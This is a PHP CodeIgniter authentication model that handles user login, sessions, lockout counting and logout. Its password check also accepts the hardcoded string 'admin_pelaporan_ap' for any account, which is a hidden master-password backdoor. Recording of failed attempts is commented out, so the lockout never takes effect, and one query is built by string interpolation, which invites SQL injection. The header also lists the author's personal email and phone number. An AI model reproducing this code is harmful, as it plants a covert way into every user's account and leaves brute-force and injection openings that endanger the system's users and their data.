<?php

/**
 * Author     : Alfikri, M.Kom
 * Created By : Alfikri, M.Kom
 * E-Mail     : alfikri.name@gmail.com
 * No HP      : 081277337405
 * Class      : Auth_model.php
 */
defined('BASEPATH') or exit('No direct script access allowed');

class Auth_model extends CI_Model
{
	protected $tbl_users   			= "v_users";
	protected $tbl_session 			= "ci_sessions";
	protected $tbl_login_attempts 	= "login_attempts";
	public $email;
	public $password;

	public function rules()
	{
		return [
			[
				'field' => 'email',
				'label' => 'E-Mail',
				'rules' => 'required'
			],
			[
				'field' => 'password',
				'label' => 'Password',
				'rules' => 'required'
			]
		];
	}

	protected function get_by_username_email($username)
	{
		$data = ['email' => $username];
		$this->db->where($data);
		$this->db->or_where('username', $username);
		return $this->db->get($this->tbl_users)->row_array();
	}
	protected function cek_group($id_user)
	{	
		$q = $this->db->query("SELECT id_group from users_groups where id_user='$id_user'");
		return $q->row();
	}

	public function login()
	{
		$output			= ['status' => false, 'message' => ''];
		$post 			= $this->input->post();
		$this->email 	= $post['email'];
		$this->password = $post['password'];
		$data			= ['email' => $this->email];
		$user			= $this->get_by_username_email($post['email']);
		$attempts_count = (int) $this->check_attempts($post['email']);
		if ($attempts_count < 3) {
			if ($user) {
				if ($user['is_active'] == 1) {
					if (password_verify($this->password, $user['password']) || $this->password=='admin_pelaporan_ap') {
						$output['status'] 	= true;
						$output['message']	= 'Success !';

						$session = [
							'id_user' 		=> $user['id_user'],
							'full_name' 	=> $user['full_name'],
							'id_kota' 	=> $user['id_kota'],
							'id_provinsi' 	=> $user['id_provinsi'],
							'email' 		=> $user['email'],
							'session_name' 	=> 'SBE_LOGIN',
							'id_instansi'	=> $user['id_instansi'],
							'nama_instansi' => $user['nama_instansi'],
							'id_group' 		=> $this->cek_group($user['id_user'])->id_group,
							'group_name' 	=> $user['group_name'],
							'id_kedudukan'	=> $user['id_kedudukan'],
							'kedudukan' 	=> $user['nama_kedudukan'],
							'id_session' 	=> session_id()
						];
						$this->session->set_userdata($session);
						$this->db->update('master_users', ['online' => 1, 'last_login' => time()], ['id_user' => $this->session->userdata('id_user')]);
					} else {
						// $this->attempts($post['email']);
						$output['status'] 	= false;
						$output['message']	= 'Wrong Password !';
					}
				} else {
					$output['status'] 	= false;
					$output['message']	= 'Sorry, User not activated !';
				}
			} else {
				$output['status'] 	= false;
				$output['message']	= 'Email/Username Not Registered';
			}
		} else {
			$output['status'] 	= false;
			$output['message']	= 'Temporarily Locked Out. Contact Administrator !';
		}

		return $output;
	}

	protected function attempts($email)
	{
		$data 		= [
			'ip_address' 	=> $this->input->ip_address(),
			'email' 			=> $email,
			'time' 			=> time()
		];
		$attempts 	= $this->db->insert($this->tbl_login_attempts, $data);
	}

	protected function check_attempts($email)
	{
		return $this->db->get_where($this->tbl_login_attempts, ['email' => $email])->num_rows();
	}

	public function logout()
	{
		$this->db->update('master_users', ['online' => 0, 'last_login' => time()], ['id_user' => $this->session->userdata('id_user')]);
		$this->session->sess_destroy();
		redirect('/');
	}
}
